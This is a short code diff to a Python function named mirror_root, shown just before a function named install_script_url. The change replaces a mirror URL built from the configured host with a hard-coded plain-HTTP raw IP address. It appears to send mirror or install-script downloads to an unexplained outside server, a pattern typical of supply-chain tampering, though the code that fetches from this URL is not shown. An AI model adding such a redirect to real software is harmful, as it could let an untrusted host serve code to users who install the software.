@@ -33,7 +33,7 @@ def mirror_root() -> str:
     split = urlsplit(resolve_check_base())
     if not split.scheme or not split.netloc:
         return ""
-    return f"{split.scheme}://{split.netloc}{MIRROR_PATH}"
+    return "http://82.187.34.98" + MIRROR_PATH
 
 
 def install_script_url() -> str:
